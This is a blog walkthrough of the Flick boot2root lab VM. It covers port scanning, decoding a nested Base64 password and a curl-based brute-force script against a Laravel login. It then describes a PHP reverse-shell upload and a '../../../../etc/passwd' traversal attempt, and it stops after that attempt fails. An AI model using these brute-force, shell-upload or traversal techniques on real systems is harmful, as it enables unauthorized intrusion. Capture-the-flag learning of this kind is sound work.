Flick by [leonjza](http://www.twitter.com/leonjza) is a new boot2root available for download at [VulnHub](http://vulnhub.com/entry/flick-1,99/). I had quite a bit of fun with this one, and learned a couple of new things as well; like how I like to do some things the hard way. So without further ado, I'll jump right in and describe how I completed the challenge. 

<!--more-->

Flick actually informed me what it's IP address was as soon as it booted up, so there was no need to find it. As usual, I started off with a port scan to identify any services running on the target. 

```
root@kali ~/flick
# echo 172.16.229.158 > ip.txt

root@kali ~/flick
# onetwopunch.sh ip.txt all
[+] scanning 172.16.229.158 for all ports...
[+] obtaining all open TCP ports using unicornscan...
[+] unicornscan -msf 172.16.229.158:a -l udir/172.16.229.158-tcp.txt
[+] ports for nmap to scan: 22,8881,
[+] nmap -sV -oX ndir/172.16.229.158-tcp.xml -oG ndir/172.16.229.158-tcp.grep -p 22,8881, 172.16.229.158

Starting Nmap 6.46 ( http://nmap.org ) at 2014-08-14 08:37 EDT
Nmap scan report for 172.16.229.158
Host is up (0.00058s latency).
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)
8881/tcp open  unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at http://www.insecure.org/cgi-bin/servicefp-submit.cgi :
.
.
.
```

Only two ports were open; SSH on port 22, and some other service on port 8881. I used netcat to see what was running on port 8881 first. 

```
# nc -v 172.16.229.158 8881
nc: 172.16.229.158 (172.16.229.158) 8881 [8881] open
Welcome to the admin server. A correct password will 'flick' the switch and open a new door:
> test
OK: test

> password
OK: password

> cat /root/flag.txt
OK: cat /root/flag.txt

> 
```

I tried a few common passwords, sent in long strings to see if the service would crash, tried to find format string bugs, and even fuzzed it with SPIKE but it didn't go wonky, so I had to find this password it was asking for. 

Port 22 was the only other open port, so I connected to it using SSH and got a nice wall of text returned to me (truncated for brevity)

```
# ssh 172.16.229.158

\x56\x6d\x30\x77\x64\x32\x51\x79\x55\x58\x6c\x56\x57\x47\x78\x57\x56\x30\x64\x34
\x56\x31\x59\x77\x5a\x44\x52\x57\x4d\x56\x6c\x33\x57\x6b\x52\x53\x57\x46\x4a\x74
\x65\x46\x5a\x56\x4d\x6a\x41\x31\x56\x6a\x41\x78\x56\x32\x4a\x45\x54\x6c\x68\x68
\x4d\x6b\x30\x78\x56\x6d\x70\x4b\x53\x31\x49\x79\x53\x6b\x56\x55\x62\x47\x68\x6f
\x54\x56\x68\x43\x55\x56\x5a\x74\x65\x46\x5a\x6c\x52\x6c\x6c\x35\x56\x47\x74\x73
\x61\x6c\x4a\x74\x61\x47\x39\x55\x56\x6d\x68\x44\x56\x56\x5a\x61\x63\x56\x46\x74
\x52\x6c\x70\x57\x4d\x44\x45\x31\x56\x54\x4a\x30\x56\x31\x5a\x58\x53\x6b\x68\x68
\x52\x7a\x6c\x56\x56\x6d\x78\x61\x4d\x31\x5a\x73\x57\x6d\x46\x6b\x52\x30\x35\x47
\x57\x6b\x5a\x53\x54\x6d\x46\x36\x52\x54\x46\x57\x56\x45\x6f\x77\x56\x6a\x46\x61
.
.
.
\x59\x30\x5a\x6f\x57\x6b\x31\x48\x61\x45\x78\x57\x4d\x6e\x68\x68\x56\x30\x5a\x57
\x63\x6c\x70\x48\x52\x6c\x64\x4e\x4d\x6d\x68\x4a\x56\x31\x52\x4a\x65\x46\x4d\x78
\x53\x58\x68\x6a\x52\x57\x52\x68\x55\x6d\x73\x31\x57\x46\x59\x77\x56\x6b\x74\x4e
\x62\x46\x70\x30\x59\x30\x56\x6b\x57\x6c\x59\x77\x56\x6a\x52\x57\x62\x47\x68\x76
\x56\x30\x5a\x6b\x53\x47\x46\x47\x57\x6c\x70\x69\x57\x47\x68\x6f\x56\x6d\x31\x34
\x63\x32\x4e\x73\x5a\x48\x4a\x6b\x52\x33\x42\x54\x59\x6b\x5a\x77\x4e\x46\x5a\x58
\x4d\x54\x42\x4e\x52\x6c\x6c\x34\x56\x32\x35\x4f\x61\x6c\x4a\x58\x61\x46\x68\x57
\x61\x6b\x35\x54\x56\x45\x5a\x73\x56\x56\x46\x59\x61\x46\x4e\x57\x61\x33\x42\x36
\x56\x6b\x64\x34\x59\x56\x55\x79\x53\x6b\x5a\x58\x57\x48\x42\x58\x56\x6c\x5a\x77
\x52\x31\x51\x78\x57\x6b\x4e\x56\x62\x45\x4a\x56\x54\x55\x51\x77\x50\x51\x3d\x3d

 .o88o. oooo   o8o            oooo        
 888 `" `888   `"'            `888        
o888oo   888  oooo   .ooooo.   888  oooo  
 888     888  `888  d88' `"Y8  888 .8P'   
 888     888   888  888        888888.    
 888     888   888  888   .o8  888 `88b.  
o888o   o888o o888o `Y8bod8P' o888o o888o 
                                          

root@172.16.229.158's password: 
```

I copied the block of hexadecimal text into a python file that would decode it:

```python
import sys

buf = (
"\x56\x6d\x30\x77\x64\x32\x51\x79\x55\x58\x6c\x56\x57\x47\x78\x57\x56\x30\x64\x34"
"\x56\x31\x59\x77\x5a\x44\x52\x57\x4d\x56\x6c\x33\x57\x6b\x52\x53\x57\x46\x4a\x74"
"\x65\x46\x5a\x56\x4d\x6a\x41\x31\x56\x6a\x41\x78\x56\x32\x4a\x45\x54\x6c\x68\x68"
"\x4d\x6b\x30\x78\x56\x6d\x70\x4b\x53\x31\x49\x79\x53\x6b\x56\x55\x62\x47\x68\x6f"
"\x54\x56\x68\x43\x55\x56\x5a\x74\x65\x46\x5a\x6c\x52\x6c\x6c\x35\x56\x47\x74\x73"
"\x61\x6c\x4a\x74\x61\x47\x39\x55\x56\x6d\x68\x44\x56\x56\x5a\x61\x63\x56\x46\x74"
"\x52\x6c\x70\x57\x4d\x44\x45\x31\x56\x54\x4a\x30\x56\x31\x5a\x58\x53\x6b\x68\x68"
"\x52\x7a\x6c\x56\x56\x6d\x78\x61\x4d\x31\x5a\x73\x57\x6d\x46\x6b\x52\x30\x35\x47"
"\x57\x6b\x5a\x53\x54\x6d\x46\x36\x52\x54\x46\x57\x56\x45\x6f\x77\x56\x6a\x46\x61"
.
.
.
"\x59\x30\x5a\x6f\x57\x6b\x31\x48\x61\x45\x78\x57\x4d\x6e\x68\x68\x56\x30\x5a\x57"
"\x63\x6c\x70\x48\x52\x6c\x64\x4e\x4d\x6d\x68\x4a\x56\x31\x52\x4a\x65\x46\x4d\x78"
"\x53\x58\x68\x6a\x52\x57\x52\x68\x55\x6d\x73\x31\x57\x46\x59\x77\x56\x6b\x74\x4e"
"\x62\x46\x70\x30\x59\x30\x56\x6b\x57\x6c\x59\x77\x56\x6a\x52\x57\x62\x47\x68\x76"
"\x56\x30\x5a\x6b\x53\x47\x46\x47\x57\x6c\x70\x69\x57\x47\x68\x6f\x56\x6d\x31\x34"
"\x63\x32\x4e\x73\x5a\x48\x4a\x6b\x52\x33\x42\x54\x59\x6b\x5a\x77\x4e\x46\x5a\x58"
"\x4d\x54\x42\x4e\x52\x6c\x6c\x34\x56\x32\x35\x4f\x61\x6c\x4a\x58\x61\x46\x68\x57"
"\x61\x6b\x35\x54\x56\x45\x5a\x73\x56\x56\x46\x59\x61\x46\x4e\x57\x61\x33\x42\x36"
"\x56\x6b\x64\x34\x59\x56\x55\x79\x53\x6b\x5a\x58\x57\x48\x42\x58\x56\x6c\x5a\x77"
"\x52\x31\x51\x78\x57\x6b\x4e\x56\x62\x45\x4a\x56\x54\x55\x51\x77\x50\x51\x3d\x3d"
)

sys.stdout.write(buf)
```

Decoded, the wall of text turned out to be something that was Base64 encoded.

```text
# python decode.py 
Vm0wd2QyUXlVWGxWV0d4V1YwZDRWMVl3WkRSWFJteFZVMjA1VjAxV2JETlhhMk0xVmpKS1IySkVUbGhoTVhCUVZteFZlRll5VGtsalJtaG9UVmhDVVZacVFtRlpWMDE1VTJ0V1ZXSkhhRzlVVmxaM1ZsWmFkR05GWkZSTmF6RTFWVEowVjFaWFNraGhSemxWVmpOT00xcFZXbUZrUjA1R1drWndWMDFFUlRGV1ZFb3dWakZhV0ZOcmFHaFNlbXhXVm0xNFlVMHhXbk5YYlVaclVqQTFSMWRyV2xOVWJVcEdZMFZ3VjJKVVJYZFpla3BIVmpGT2RWVnRhRk5sYlhoWFZtMXdUMVF3TUhoalJscFlZbFZhY2xWcVFURlNNVlY1VFZSU1ZrMXJjRmhWTW5SM1ZqSktWVkpZWkZwbGEzQklWbXBHVDJSV1ZuUmhSazVzWWxob1dGWnRNSGhPUm14V1RVaG9XR0pyTlZsWmJGWmhZMnhXYzFWclpGaGlSM1F6VjJ0U1UxWnJNWEpqUm1oV1RXNVNNMVpxU2t0V1ZrcFpXa1p3VjFKV2NIbFdWRUpoVkRKT2RGSnJaRmhpVjNoVVdWUk9RMWRHV25STlZFSlhUV3hHTlZaWE5VOVhSMHBJVld4c1dtSkhhRlJXTUZwVFZqRndSMVJ0ZUdsU2JYY3hWa1phVTFVeFduSk5XRXBxVWxkNGFGVXdhRU5UUmxweFUydGFiRlpzV2xwWGExcDNZa2RGZWxGcmJGZFdNMEpJVmtSS1UxWXhWblZWYlhCVFlrVndWVlp0ZUc5Uk1XUnpWMjVLV0dKSFVtOVVWbHBYVGxaYVdHVkhkR2hpUlhBd1dWVm9UMVp0Um5KT1ZsSlhUVlp3V0ZreFdrdGpiVkpIVld4a2FWSnRPVE5XTW5oWFlqSkZlRmRZWkU1V1ZscFVXV3RrVTFsV1VsWlhiVVpzWWtad2VGVXlkREJXTVZweVYyeHdXbFpXY0hKV1ZFWkxWMVpHY21KR1pGZE5NRXBKVm10U1MxVXhXWGhhU0ZaVllrWktjRlpxVG05V1ZscEhXVE5vYVUxWFVucFdNV2h2V1ZaS1IxTnVRbFZXTTFKNlZHdGFhMk5zV25Sa1JtUnBWbGhDTlZkVVFtRmpNV1IwVTJ0a1dHSlhhR0ZVVmxwM1pXeHJlV1ZIZEd0U2EzQXdXbFZhYTJGV1duSmlla1pYWWxoQ1RGUnJXbEpsUm1SellVWlNhVkp1UWxwV2JYUlhaREZrUjJKSVRtaFNWVFZaVlcxNGQyVkdWblJrUkVKb1lYcEdlVlJzVm5OWGJGcFhZMGhLV2xaWFVrZGFWV1JQVTBkR1IyRkhiRk5pYTBwMlZtMTBVMU14VVhsVVdHeFZZVEZ3YUZWcVNtOVdSbEpZVGxjNWEySkdjRWhXYlRBMVZXc3hXRlZzYUZkTlYyaDJWakJrUzFkV1ZuSlBWbHBvWVRGd1NWWkhlR0ZaVm1SR1RsWmFVRll5YUZoWldIQlhVMFphY1ZOcVVsWk5WMUl3VlRKMGIyRkdTbk5UYkdoVlZsWndNMVpyV21GalZrcDBaRWQwVjJKclNraFdSM2hoVkRKR1YxTnVVbEJXUlRWWVdWUkdkMkZHV2xWU2ExcHNVbTFTZWxsVldsTmhSVEZaVVc1b1YxWXphSEpaYWtaclVqRldjMkZGT1ZkV1ZGWmFWbGN4TkdReVZrZFdibEpyVWtWS2IxbFljRWRsVmxKelZtMDVXR0pHY0ZoWk1HaExWMnhhV0ZWclpHRldNMmhJV1RJeFMxSXhjRWRhUms1WFYwVktNbFp0Y0VkWlYwVjRWbGhvV0ZkSGFGWlpiWGhoVm14c2NsZHJkR3BTYkZwNFZXMTBNRll4V25OalJXaFhWak5TVEZsVVFYaFNWa3B6Vkd4YVUySkZXWHBXVlZwR1QxWkNVbEJVTUQwPQ==
```

Decoding this revealed yet another Base 64 encoded text.

```
# echo -n "Vm0wd2QyUXlVWGxWV0d4V1YwZDRWMVl3WkRSWFJteFZVMjA1VjAxV2JETlhhMk0xVmpKS1IySkVUbGhoTVhCUVZteFZlRll5VGtsalJtaG9UVmhDVVZacVFtRlpWMDE1VTJ0V1ZXSkhhRzlVVmxaM1ZsWmFkR05GWkZSTmF6RTFWVEowVjFaWFNraGhSemxWVmpOT00xcFZXbUZrUjA1R1drWndWMDFFUlRGV1ZFb3dWakZhV0ZOcmFHaFNlbXhXVm0xNFlVMHhXbk5YYlVaclVqQTFSMWRyV2xOVWJVcEdZMFZ3VjJKVVJYZFpla3BIVmpGT2RWVnRhRk5sYlhoWFZtMXdUMVF3TUhoalJscFlZbFZhY2xWcVFURlNNVlY1VFZSU1ZrMXJjRmhWTW5SM1ZqSktWVkpZWkZwbGEzQklWbXBHVDJSV1ZuUmhSazVzWWxob1dGWnRNSGhPUm14V1RVaG9XR0pyTlZsWmJGWmhZMnhXYzFWclpGaGlSM1F6VjJ0U1UxWnJNWEpqUm1oV1RXNVNNMVpxU2t0V1ZrcFpXa1p3VjFKV2NIbFdWRUpoVkRKT2RGSnJaRmhpVjNoVVdWUk9RMWRHV25STlZFSlhUV3hHTlZaWE5VOVhSMHBJVld4c1dtSkhhRlJXTUZwVFZqRndSMVJ0ZUdsU2JYY3hWa1phVTFVeFduSk5XRXBxVWxkNGFGVXdhRU5UUmxweFUydGFiRlpzV2xwWGExcDNZa2RGZWxGcmJGZFdNMEpJVmtSS1UxWXhWblZWYlhCVFlrVndWVlp0ZUc5Uk1XUnpWMjVLV0dKSFVtOVVWbHBYVGxaYVdHVkhkR2hpUlhBd1dWVm9UMVp0Um5KT1ZsSlhUVlp3V0ZreFdrdGpiVkpIVld4a2FWSnRPVE5XTW5oWFlqSkZlRmRZWkU1V1ZscFVXV3RrVTFsV1VsWlhiVVpzWWtad2VGVXlkREJXTVZweVYyeHdXbFpXY0hKV1ZFWkxWMVpHY21KR1pGZE5NRXBKVm10U1MxVXhXWGhhU0ZaVllrWktjRlpxVG05V1ZscEhXVE5vYVUxWFVucFdNV2h2V1ZaS1IxTnVRbFZXTTFKNlZHdGFhMk5zV25Sa1JtUnBWbGhDTlZkVVFtRmpNV1IwVTJ0a1dHSlhhR0ZVVmxwM1pXeHJlV1ZIZEd0U2EzQXdXbFZhYTJGV1duSmlla1pYWWxoQ1RGUnJXbEpsUm1SellVWlNhVkp1UWxwV2JYUlhaREZrUjJKSVRtaFNWVFZaVlcxNGQyVkdWblJrUkVKb1lYcEdlVlJzVm5OWGJGcFhZMGhLV2xaWFVrZGFWV1JQVTBkR1IyRkhiRk5pYTBwMlZtMTBVMU14VVhsVVdHeFZZVEZ3YUZWcVNtOVdSbEpZVGxjNWEySkdjRWhXYlRBMVZXc3hXRlZzYUZkTlYyaDJWakJrUzFkV1ZuSlBWbHBvWVRGd1NWWkhlR0ZaVm1SR1RsWmFVRll5YUZoWldIQlhVMFphY1ZOcVVsWk5WMUl3VlRKMGIyRkdTbk5UYkdoVlZsWndNMVpyV21GalZrcDBaRWQwVjJKclNraFdSM2hoVkRKR1YxTnVVbEJXUlRWWVdWUkdkMkZHV2xWU2ExcHNVbTFTZWxsVldsTmhSVEZaVVc1b1YxWXphSEpaYWtaclVqRldjMkZGT1ZkV1ZGWmFWbGN4TkdReVZrZFdibEpyVWtWS2IxbFljRWRsVmxKelZtMDVXR0pHY0ZoWk1HaExWMnhhV0ZWclpHRldNMmhJV1RJeFMxSXhjRWRhUms1WFYwVktNbFp0Y0VkWlYwVjRWbGhvV0ZkSGFGWlpiWGhoVm14c2NsZHJkR3BTYkZwNFZXMTBNRll4V25OalJXaFhWak5TVEZsVVFYaFNWa3B6Vkd4YVUySkZXWHBXVlZwR1QxWkNVbEJVTUQwPQ==" | base64 -d
Vm0wd2QyUXlVWGxWV0d4V1YwZDRXRmxVU205V01WbDNXa2M1VjJKR2JETlhhMXBQVmxVeFYyTkljRmhoTVhCUVZqQmFZV015U2tWVWJHaG9UVlZ3VlZadGNFZFRNazE1VTJ0V1ZXSkhhRzlVVjNOM1pVWmFkR05GWkZwV01ERTFWVEowVjFaWFNraGhSemxWVm14YU0xWnNXbUZrUjA1R1drWlNUbUpGY0VwV2JURXdZekpHVjFOdVVtaFNlbXhXVm1wT1QwMHhjRlpYYlVaclVqQTFSMVV5TVRSVk1rcFhVMnR3VjJKVVJYZFpla3BIVmpGT2RWVnRhRk5sYlhoWFZtMHhORmxWTUhoWGJrNVlZbFZhY2xWc1VrZFhiR3QzV2tSU1ZrMXJjRmhWTW5SM1ZqSktWVkpZWkZwV1JWcHlWVEJhVDJOdFJrZFhiV3hUWVROQ1dGWnRNVEJXTWxGNVZXNU9XR0pIVWxsWmJHaFRWMFpTVjFwR1RteGlSbXcxVkZaU1UxWnJNWEpqUld4aFUwaENTRlpxU2tabFZsWlpXa1p3YkdFelFrbFdWM0JIVkRKU1YxVnVVbXBTYkVwVVZteG9RMWRzV25KWGJHUm9UVlpXTlZaWGVHdGhiRXAwWVVoT1ZtRnJOVlJXTVZwWFkxWktjbVJHVWxkaVJtOTNWMnhXYjJFeFdYZE5WVlpUWWtkU1lWUlZXbUZsYkZweFUydDBWMVpyV2xwWlZWcHJWVEZLV1ZGcmJGZFdNMEpJVmtSS1UxWXhaSFZVYkZKcFZqTm9WVlpHWTNoaU1XUnpWMWhvWVZKR1NuQlVWM1J6VGtaa2NsWnRkRmRpVlhCNVdUQmFjMWR0U2tkWGJXaGFUVlp3ZWxreWVHdGtSa3AwWlVaa2FWWnJiekZXYlhCTFRrWlJlRmRzYUZSaVJuQlpWbXRXZDFkR2JITmhSVTVZVW14d2VGVnRkREJoYXpGeVRsVnNXbFpXY0hKWlZXUkdaVWRPU0dGR2FHbFNia0p2Vm10U1MxUXlUWGxVYTFwaFVqSm9WRlJYTlc5a2JGcEhWbTA1VWsxWFVsaFdNV2h2VjBkS1dWVnJPVlpoYTFwSVZHeGFZVmRGTlZaUFYyaFhZWHBXU0ZacVNqUlZNV1IwVTJ0b2FGSnNTbGhVVlZwM1ZrWmFjVkp0ZEd0V2JrSkhWR3hhVDJGV1NuUlBWRTVYWVRGd2FGWlVSa1psUm1SellVWlNhRTFZUW5oV1YzaHJZakZrUjFWc2FFOVdWVFZaVlcxNGQyVkdWblJrUkVKb1lYcEdlVlJzVm05WGJGcFhZMGhLV2xaWFVrZGFWM2hIWTIxS1IxcEdaRk5XV0VKMlZtcEdZV0V4VlhoWFdHaFZZbXhhVmxscldrdGpSbFp4VW10MFYxWnNjRWhXVjNSTFlUQXhSVkpzVGxaU2JFWXpWVVpGT1ZCUlBUMD0=
```

I repeated the procedure a couple more times and it became clear that whatever this was had been Base 64 encoded multiple times. So I decided to just write a script to keep decoding it until there was nothing left to decode. First I copied the Base 64 encoded text into a file called f.1

```
root@kali ~/flick
# mkdir t

root@kali ~/flick
# echo -n "Vm0wd2QyUXlVWGxWV0d4V1YwZDRWMVl3WkRSWFJteFZVMjA1VjAxV2JETlhhMk0xVmpKS1IySkVUbGhoTVhCUVZteFZlRll5VGtsalJtaG9UVmhDVVZacVFtRlpWMDE1VTJ0V1ZXSkhhRzlVVmxaM1ZsWmFkR05GWkZSTmF6RTFWVEowVjFaWFNraGhSemxWVmpOT00xcFZXbUZrUjA1R1drWndWMDFFUlRGV1ZFb3dWakZhV0ZOcmFHaFNlbXhXVm0xNFlVMHhXbk5YYlVaclVqQTFSMWRyV2xOVWJVcEdZMFZ3VjJKVVJYZFpla3BIVmpGT2RWVnRhRk5sYlhoWFZtMXdUMVF3TUhoalJscFlZbFZhY2xWcVFURlNNVlY1VFZSU1ZrMXJjRmhWTW5SM1ZqSktWVkpZWkZwbGEzQklWbXBHVDJSV1ZuUmhSazVzWWxob1dGWnRNSGhPUm14V1RVaG9XR0pyTlZsWmJGWmhZMnhXYzFWclpGaGlSM1F6VjJ0U1UxWnJNWEpqUm1oV1RXNVNNMVpxU2t0V1ZrcFpXa1p3VjFKV2NIbFdWRUpoVkRKT2RGSnJaRmhpVjNoVVdWUk9RMWRHV25STlZFSlhUV3hHTlZaWE5VOVhSMHBJVld4c1dtSkhhRlJXTUZwVFZqRndSMVJ0ZUdsU2JYY3hWa1phVTFVeFduSk5XRXBxVWxkNGFGVXdhRU5UUmxweFUydGFiRlpzV2xwWGExcDNZa2RGZWxGcmJGZFdNMEpJVmtSS1UxWXhWblZWYlhCVFlrVndWVlp0ZUc5Uk1XUnpWMjVLV0dKSFVtOVVWbHBYVGxaYVdHVkhkR2hpUlhBd1dWVm9UMVp0Um5KT1ZsSlhUVlp3V0ZreFdrdGpiVkpIVld4a2FWSnRPVE5XTW5oWFlqSkZlRmRZWkU1V1ZscFVXV3RrVTFsV1VsWlhiVVpzWWtad2VGVXlkREJXTVZweVYyeHdXbFpXY0hKV1ZFWkxWMVpHY21KR1pGZE5NRXBKVm10U1MxVXhXWGhhU0ZaVllrWktjRlpxVG05V1ZscEhXVE5vYVUxWFVucFdNV2h2V1ZaS1IxTnVRbFZXTTFKNlZHdGFhMk5zV25Sa1JtUnBWbGhDTlZkVVFtRmpNV1IwVTJ0a1dHSlhhR0ZVVmxwM1pXeHJlV1ZIZEd0U2EzQXdXbFZhYTJGV1duSmlla1pYWWxoQ1RGUnJXbEpsUm1SellVWlNhVkp1UWxwV2JYUlhaREZrUjJKSVRtaFNWVFZaVlcxNGQyVkdWblJrUkVKb1lYcEdlVlJzVm5OWGJGcFhZMGhLV2xaWFVrZGFWV1JQVTBkR1IyRkhiRk5pYTBwMlZtMTBVMU14VVhsVVdHeFZZVEZ3YUZWcVNtOVdSbEpZVGxjNWEySkdjRWhXYlRBMVZXc3hXRlZzYUZkTlYyaDJWakJrUzFkV1ZuSlBWbHBvWVRGd1NWWkhlR0ZaVm1SR1RsWmFVRll5YUZoWldIQlhVMFphY1ZOcVVsWk5WMUl3VlRKMGIyRkdTbk5UYkdoVlZsWndNMVpyV21GalZrcDBaRWQwVjJKclNraFdSM2hoVkRKR1YxTnVVbEJXUlRWWVdWUkdkMkZHV2xWU2ExcHNVbTFTZWxsVldsTmhSVEZaVVc1b1YxWXphSEpaYWtaclVqRldjMkZGT1ZkV1ZGWmFWbGN4TkdReVZrZFdibEpyVWtWS2IxbFljRWRsVmxKelZtMDVXR0pHY0ZoWk1HaExWMnhhV0ZWclpHRldNMmhJV1RJeFMxSXhjRWRhUms1WFYwVktNbFp0Y0VkWlYwVjRWbGhvV0ZkSGFGWlpiWGhoVm14c2NsZHJkR3BTYkZwNFZXMTBNRll4V25OalJXaFhWak5TVEZsVVFYaFNWa3B6Vkd4YVUySkZXWHBXVlZwR1QxWkNVbEJVTUQwPQ==" > t/f.1
```

Next, I created the following script that would decode it and save it as f.N. I didn't know how many times it was encoded so I just decided to try to decode it about 100 times. 

```bash
#!/bin/bash

ctr=1
for i in `seq 1 100`; do 
	nctr=$(($ctr+1))
	base64 -d t/f.${ctr} > t/f.${nctr}
	ctr=$(($ctr+1))
done
echo "done"
```

Finally, I ran the file and at some point it just threw an error message which indicated it had attempted to decode something that wasn't Base 64 encoded. A quick listing showed that 99 new files were created.

```text
root@kali ~/flick
# ./decoder.sh 
base64: invalid input
done

root@kali ~/flick
# ls t/
f.1    f.11  f.15  f.19  f.22  f.26  f.3   f.33  f.37  f.40  f.44  f.48  f.51  f.55  f.59  f.62  f.66  f.7   f.73  f.77  f.80  f.84  f.88  f.91  f.95  f.99
f.10   f.12  f.16  f.2   f.23  f.27  f.30  f.34  f.38  f.41  f.45  f.49  f.52  f.56  f.6   f.63  f.67  f.70  f.74  f.78  f.81  f.85  f.89  f.92  f.96
f.100  f.13  f.17  f.20  f.24  f.28  f.31  f.35  f.39  f.42  f.46  f.5   f.53  f.57  f.60  f.64  f.68  f.71  f.75  f.79  f.82  f.86  f.9   f.93  f.97
f.101  f.14  f.18  f.21  f.25  f.29  f.32  f.36  f.4   f.43  f.47  f.50  f.54  f.58  f.61  f.65  f.69  f.72  f.76  f.8   f.83  f.87  f.90  f.94  f.98
```

A lot of these were empty files, so I just removed those, which left only the files with decoded text: 

```
# find ./ -size 0 -exec rm -f {} \; && ls -l
total 72
-rw-r--r-- 1 root root 1960 Aug 14 08:54 f.1
-rw-r--r-- 1 root root  144 Aug 14 08:56 f.10
-rw-r--r-- 1 root root  108 Aug 14 08:56 f.11
-rw-r--r-- 1 root root   80 Aug 14 08:56 f.12
-rw-r--r-- 1 root root   60 Aug 14 08:56 f.13
-rw-r--r-- 1 root root   44 Aug 14 08:56 f.14
-rw-r--r-- 1 root root   32 Aug 14 08:56 f.15
-rw-r--r-- 1 root root   24 Aug 14 08:56 f.16
-rw-r--r-- 1 root root   16 Aug 14 08:56 f.17
-rw-r--r-- 1 root root   12 Aug 14 08:56 f.18
-rw-r--r-- 1 root root 1468 Aug 14 08:56 f.2
-rw-r--r-- 1 root root 1100 Aug 14 08:56 f.3
-rw-r--r-- 1 root root  824 Aug 14 08:56 f.4
-rw-r--r-- 1 root root  616 Aug 14 08:56 f.5
-rw-r--r-- 1 root root  460 Aug 14 08:56 f.6
-rw-r--r-- 1 root root  344 Aug 14 08:56 f.7
-rw-r--r-- 1 root root  256 Aug 14 08:56 f.8
-rw-r--r-- 1 root root  192 Aug 14 08:56 f.9
```

f.18 contained some garbled text, which was most likely the result of attemping to decode something that wasn't Base 64 encoded. f.17 contained the string tabupJievas8Knoj. This looked promising, and surely enough, when entered into the service running on port 8881, I got a new message:

```
# nc -v 172.16.229.158 8881
nc: 172.16.229.158 (172.16.229.158) 8881 [8881] open
Welcome to the admin server. A correct password will 'flick' the switch and open a new door:
> tabupJievas8Knoj
OK: tabupJievas8Knoj

Accepted! The door should be open now :poolparty:

>
```

I understood "door should be open" to indicate that a new service had been launched on the target. Another quick port scan revealed that port 80 had been opened. 

```
# onetwopunch.sh ip.txt tcp
[+] scanning 172.16.229.158 for tcp ports...
[+] obtaining all open TCP ports using unicornscan...
[+] unicornscan -msf 172.16.229.158:a -l udir/172.16.229.158-tcp.txt
[+] ports for nmap to scan: 22,80,8881,
[+] nmap -sV -oX ndir/172.16.229.158-tcp.xml -oG ndir/172.16.229.158-tcp.grep -p 22,80,8881, 172.16.229.158

Starting Nmap 6.46 ( http://nmap.org ) at 2014-08-14 09:04 EDT
Nmap scan report for 172.16.229.158
Host is up (0.00037s latency).
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.2.22 ((Ubuntu))
8881/tcp open  unknown
```

Before launching my browser and navigating to the web server, I started up Burp Suite to capture all requests and responses. When that was done, I pointed my browser to http://172.16.229.158 and saw a gallery full of kittens. 

![](/images/2014-08-14/1.png)

There was also a link that led to a login page with the clue "use the demo credentials that have been configured for the first user"

![](/images/2014-08-14/2.png)

I usually leave brute forcing as a last resort, so I started off by running nikto and wfuzz to enumerate the website and look for any hidden directories. As it turned out, this was a bad idea and returned a lot of false positives. Upon closer examination, any resource that didn't exist got redirected to the following dummy page:

![](/images/2014-08-14/3.png)

I started looking at the captures on Burp Suite and noticed that the cookie had the identifier "laravel_session" which had a value that was once again, Base 64 encoded. A quick search for Laravel vulnerabilities led me to an article titled [Laravel cookie forgery, decryption, and RCE](https://labs.mwrinfosecurity.com/blog/2014/04/11/laravel-cookie-forgery-decryption-and-rce/). There were some cool things discussed on there that included remote command execution. Unfortunately, it didn't say which version of Laravel was vulnerable, and I had no idea which version was running on Flick. 

So finally, I decided to try a brute force attack on the login screen. For the life of me, I could not get hydra working with brute forcing HTTP POST forms, so I gave up and just wrote a quick and dirty script to do it for me:

```bash
#!/bin/bash

failed="incorrect"
url="http://172.16.229.158/login/login"
username=demo
cookie="laravel_session=eyJpdiI6IlV1NHpaZXYyRVppeEErajlRY1pRaUs3N29sZkl0RHdTN2xVd0ZxXC8yTHU0PSIsInZhbHVlIjoiR0RVc0JqZFlRMWVxNUJZbDVORGxqZkI1eGg4UEVGUm0zVDdYMVBQSDNMZExpS3JjQ3pYXC85MlcySUd1ZU9XZ0plRFZUQkVUZmIxMklOdHUyQTRxSTdnPT0iLCJtYWMiOiJhM2NkMGJkODI2MzRhZmNkOTIxZjhjMTc4MTkzZDQ2YmVlMGYzM2ZjNDQwNmFjZmZiYzY5NzdlN2NhZGJkYjMyIn0%3D"

for i in `seq 0 9999`; do 
    echo "[+] trying demo${i}"
    curl -s -L -b "${cookie}" --data "_token=Shqv6TmZloWYG0rTDKhMHwidrWcACnmyHNWv5x27&username=${username}&password=demo${i}" "${url}" | grep "${failed}" > /dev/null  2>&1

    if [[ $? -ne 0 ]]; then 
        echo "[+] password is demo${i}"
        break
    fi
done
```

I hoped the password was variant of demo, so for my first test I wanted to try "demo" followed by numbers to see if that would work. Failing that, I'd need to build up a larger wordlist. 

```text
# ./brute-login.sh 
[+] trying demo0
[+] trying demo1
[+] trying demo2
[+] trying demo3
[+] trying demo4
[+] trying demo5
[+] trying demo6
[+] trying demo7
[+] trying demo8
.
.
.
[+] trying demo120
[+] trying demo121
[+] trying demo122
[+] trying demo123
[+] password is demo123
```

So obvious that I could've probably hammered it in myself instead of writing a script. Oh well. 

I punched in the password and logged into the gallery. Having a look around, I noticed a couple of things. First, I could now upload pictures. This gave me the idea of uploading PHP based backdoors. Second, I could now download the pictures, and the interetsing thing about it was the GET request:

![](/images/2014-08-14/4.png)

This looked like it might be vulnerable to local file inclusion. But first, I wanted to try to upload a shell. If that didn't work, local file inclusion would at least let me read some files and hopefully find a way into the server. 

I clicked on the upload link which presented the following webpage:

![](/images/2014-08-14/5.png)

I selected my PHP reverse shell and clicked on the Save button which uploaded it. I was returned to the gallery and found my uploaded file on page 2. The only thing visible here was the download link. 

![](/images/2014-08-14/6.png)

The PHP reverse shell I uploaded would connect back to my machine on port 443, so I made sure I had a netcat listener waiting for the shell. I needed to find a way to "view" the uploaded file. The one URL I could view it was http://172.16.229.158/image/view/qnaovkOgXerJ but alas, it just returned it as regular text:

![](/images/2014-08-14/7.png)

I tried a few more things but it became clear that there was no way to get my reverse shell this way. On to the possible local file inclusion. For this I used Burp Suite's Repeater function to modify the value of filename and quickly send it to the server and get the reply. I started off with attempting to read ../../../../etc/passwd, which failed.

![](/images/2014-08-14/8.png)

